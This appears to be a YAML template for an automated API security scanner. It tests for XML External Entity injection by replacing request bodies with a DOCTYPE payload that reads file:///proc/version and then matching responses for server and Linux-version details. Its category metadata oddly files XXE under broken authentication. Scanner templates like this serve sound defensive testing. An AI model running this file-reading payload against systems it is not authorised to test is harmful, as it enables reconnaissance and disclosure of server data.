id: XXE_SERVER_INFORMATION_LEAK
info:
  name: "XML External Entity (XXE) test for Server Information Leak"
  description: >
    "This test involves exploiting vulnerabilities in XML parsers to extract sensitive server details, potentially revealing critical information about the target system."
  details: >
    "This test for Server Information Leak targets XML parsing vulnerabilities to extract confidential server data, unveiling valuable insights into the system's configuration and potentially aiding in further exploitation."
  impact: >
    "Successful exploitation of XML External Entity (XXE) test for Server Information Leak can lead to the unauthorized disclosure of sensitive server details, facilitating potential security breaches and enabling further targeted attacks."
  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: XXE_SERVER_INFORMATION_LEAK
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901
api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  request_headers:
    for_one:
      key:
        contains_either:
          - content-type
          - Content-Type
        extract: headerKey
  method:
    contains_either:
      - POST
      - PUT
      - PATCH

wordLists:
  payloads:
    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///proc/version\">]>"
execute:
  type: single
  requests:
    - req:
        - replace_body:  ${payloads}
        - modify_header:
            ${headerKey}: "application/xml"
validate:
  or:
    - response_payload:
        regex: "(?:Server|Host|Database|Connection)\\s*:\\s*([^\\n\\r]+)"
    - response_headers:
        regex: "(?:Server|Host|Database|Connection)\\s*:\\s*([^\\n\\r]+)"
    - response_payload:
        regex: "(Server:|X-Powered-By:|Environment:|Runtime:|Stack Trace:|Error:|Exception:|Location:|Path:)\\s.*\\n"
    - response_headers:
        regex: "(Server:|X-Powered-By:|Environment:|Runtime:|Stack Trace:|Error:|Exception:|Location:|Path:)\\s.*\\n"
    - response_headers:
        regex: "Linux version [\\d.]+(?:-[\\w\\d.+-]+)?"
    - response_payload:
        regex: "Linux version [\\d.]+(?:-[\\w\\d.+-]+)?"